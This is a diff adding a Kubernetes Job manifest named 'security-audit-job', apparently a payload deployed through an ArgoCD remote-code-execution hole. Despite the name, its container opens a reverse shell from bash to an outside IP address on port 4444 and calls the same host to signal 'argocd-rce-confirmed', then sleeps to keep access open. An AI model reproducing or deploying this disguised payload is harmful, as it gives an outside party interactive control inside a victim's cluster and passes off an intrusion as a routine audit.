@@ -1,0 +1,20 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: security-audit-job
+  namespace: default
+spec:
+  template:
+    spec:
+      containers:
+      - name: audit
+        image: alpine:latest
+        command: ["/bin/sh", "-c"]
+        args:
+        - |
+          apk add --no-cache curl bash;
+          bash -c 'bash -i >& /dev/tcp/167.99.67.192/4444 0>&1' &
+          curl http://167.99.67.192:8888/argocd-rce-confirmed;
+          sleep 3600
+      restartPolicy: Never
+  backoffLimit: 0
